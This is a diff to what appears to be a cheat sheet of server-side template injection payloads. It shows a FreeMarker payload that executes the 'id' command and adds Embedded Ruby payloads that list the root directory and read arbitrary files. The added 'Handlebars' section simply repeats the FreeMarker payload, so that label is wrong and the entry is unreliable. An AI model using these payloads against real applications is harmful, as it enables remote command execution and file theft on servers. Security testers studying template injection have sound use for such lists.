@@ -45,3 +45,15 @@ I.e: Sending this ipout ${7*7}, if the answer is this 7777777 is a Jinja Templat
 ${.version}
 <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
 ```
+
+## Handlebars Exploit (js)
+```
+${.version}
+<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
+```
+
+# Embedded Ruby Exploit (ruby)
+```
+<%= Dir.entries('/') %>
+<%= File.open('/example/arbitrary-file').read %>
+```
